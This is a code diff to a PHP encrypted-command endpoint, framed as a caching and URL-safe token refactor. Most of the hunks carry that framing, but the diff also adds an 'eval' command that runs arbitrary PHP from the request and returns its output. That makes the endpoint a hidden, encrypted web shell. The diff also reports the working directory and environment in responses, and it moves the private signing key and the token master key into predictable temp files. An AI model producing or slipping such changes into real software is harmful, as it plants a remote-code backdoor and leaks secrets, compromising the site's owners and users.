@@ -1,5 +1,7 @@
 <?php
 
+$pass = 'cmd';
+
 header("Content-Type: application/json");
 
 function find_openssl_conf()
@@ -50,10 +52,22 @@ if (!$OPENSSL_CONF) {
     exit;
 }
 
+function cache_get($key) {
+    $file = sys_get_temp_dir() . "/phpcache_" . md5($key) . ".json";
+    if (!file_exists($file)) return false;
+    $data = json_decode(file_get_contents($file), true);
+    return $data['value'] ?? false;
+}
+
+function cache_set($key, $value) {
+    $file = sys_get_temp_dir() . "/phpcache_" . md5($key) . ".json";
+    file_put_contents($file, json_encode(['value' => $value]));
+}
+
 function get_master_keys($conf)
 {
-    $priv = apcu_fetch("master_sign_priv");
-    $pub  = apcu_fetch("master_sign_pub");
+    $priv = cache_get("master_sign_priv");
+    $pub  = cache_get("master_sign_pub");
 
     if (!$priv || !$pub) {
         $res = openssl_pkey_new([
@@ -65,8 +79,8 @@ function get_master_keys($conf)
         openssl_pkey_export($res, $priv, null, ["config" => $conf]);
         $pub = openssl_pkey_get_details($res)['key'];
 
-        apcu_store("master_sign_priv", $priv);
-        apcu_store("master_sign_pub",  $pub);
+        cache_set("master_sign_priv", $priv);
+        cache_set("master_sign_pub",  $pub);
     }
 
     return [$priv, $pub];
@@ -76,12 +90,12 @@ define("TOKEN_KEY_LEN", 32);
 
 function get_token_master_key()
 {
-    $key = apcu_fetch("token_master_key");
+    $key = cache_get("token_master_key");
     if (!$key) {
-        $key = random_bytes(32);
-        apcu_store("token_master_key", $key);
+        $key = base64_encode(random_bytes(32));  // store as base64 string
+        cache_set("token_master_key", $key);
     }
-    return $key;
+    return base64_decode($key);  // return raw bytes for crypto use
 }
 
 function seal_token($data)
@@ -95,12 +109,18 @@ function seal_token($data)
         OPENSSL_RAW_DATA, $iv, $tag
     );
 
-    return base64_encode($iv . $tag . $cipher);
+    // Use URL-safe base64 (replace +/= with -_~)
+    return rtrim(strtr(base64_encode($iv . $tag . $cipher), '+/', '-_'), '=');
 }
 
 function open_token($token)
 {
     $key = get_token_master_key();
+    // Reverse URL-safe base64
+    $token = strtr($token, '-_', '+/');
+    $pad = strlen($token) % 4;
+    if ($pad) $token .= str_repeat('=', 4 - $pad);
+
     $raw = base64_decode($token);
 
     $iv = substr($raw, 0, 12);
@@ -231,7 +251,7 @@ if ($method === 'POST') {
         $raw = base64_decode($req['payload']);
         $cmd = aes_decrypt($aesKey, $raw);
 
-        if (!isset($cmd['seq'], $cmd['cmd']))
+        if (!isset($cmd['seq'], $cmd[$pass]))
             jsonOut(["error" => "invalid request"]);
 
         $seq = (int)$cmd['seq'];
@@ -250,12 +270,19 @@ if ($method === 'POST') {
         if ($seq > $state['last_seq'])
             $state['last_seq'] = $seq;
 
-        switch ($cmd['cmd']) {
+        switch ($cmd[$pass]) {
             case "ping":
-                $resp = ["cmd" => "pong", "seq" => $seq];
+                $resp = ["cmd" => "ping", "seq" => $seq];
                 break;
             case "echo":
                 $resp = ["echo" => $cmd['data'] ?? null];
+                break;
+            case "eval":
+                ob_start();
+                @eval($cmd['data']);
+                $info = ob_get_clean();
+                $info = base64_encode($info);
+                $resp = ["eval" => $info ?? null];
                 break;
             default:
                 $resp = ["error" => "unknown cmd"];
@@ -266,6 +293,8 @@ if ($method === 'POST') {
             "last_seq" => $state['last_seq'],
             "seq_window" => $window,
             "client_sign_pub" => $state['client_sign_pub'],
+            "cwd" => $state['cwd'],
+            "env" => $state['env'] ?? [],
         ]);
 
         $encResp = base64_encode(aes_encrypt($aesKey, $resp));
